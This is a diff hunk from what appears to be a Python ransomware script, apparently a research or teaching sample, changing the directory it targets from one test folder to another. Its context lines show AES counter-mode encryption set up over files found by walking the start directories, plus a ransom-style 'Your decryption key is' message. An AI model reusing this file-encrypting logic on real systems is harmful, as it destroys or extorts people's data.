@@ -60,7 +60,7 @@ Your decryption key is: '{}'
     crypt = AES.new(key, AES.MODE_CTR, counter=ctr)
 
     # change this to fit your needs.
-    startdirs = ['/home/student/Desktop/Prueba']
+    startdirs = ['/home/miguel/Desktop/Research/Prueba']
 
     for currentDir in startdirs:
         for file in discover.discoverFiles(currentDir):
